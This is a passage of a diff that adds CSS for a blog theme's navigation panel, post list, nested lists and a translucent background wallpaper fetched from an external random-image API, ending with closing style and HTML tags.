+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+
+
+</html>
